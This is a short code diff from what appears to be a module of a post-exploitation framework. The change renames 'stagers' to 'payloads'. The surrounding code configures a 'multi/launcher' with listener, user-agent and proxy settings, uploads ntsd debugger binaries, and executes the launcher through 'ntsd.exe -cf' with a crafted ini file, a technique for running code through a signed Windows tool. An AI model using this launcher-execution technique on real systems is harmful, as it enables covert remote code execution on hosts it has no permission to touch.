@@ -127,7 +127,7 @@ class Module:
           return ''
         else:
 
-          l = self.mainMenu.stagers.stagers['multi/launcher']
+          l = self.mainMenu.payloads.payloads['multi/launcher']
           l.options['Listener']['Value'] = self.options['Listener']['Value']
           l.options['UserAgent']['Value'] = self.options['UserAgent']['Value']
           l.options['Proxy']['Value'] = self.options['Proxy']['Value']
@@ -148,8 +148,8 @@ class Module:
 
            exec_write = "Write-Ini %s \"%s\"" % (uploadPath, launcher)
            code_exec = "%s\\ntsd.exe -cf %s\\ntsd.ini %s" % (uploadPath, uploadPath, bin)
-           ntsd_exe_upload = self.mainMenu.stagers.generate_upload(ntsd_exe_data, ntsd_exe_upload_path)
-           ntsd_dll_upload = self.mainMenu.stagers.generate_upload(ntsd_dll_data, ntsd_dll_upload_path)
+           ntsd_exe_upload = self.mainMenu.payloads.generate_upload(ntsd_exe_data, ntsd_exe_upload_path)
+           ntsd_dll_upload = self.mainMenu.payloads.generate_upload(ntsd_dll_data, ntsd_dll_upload_path)
 
            script += "\r\n"
            script += ntsd_exe_upload
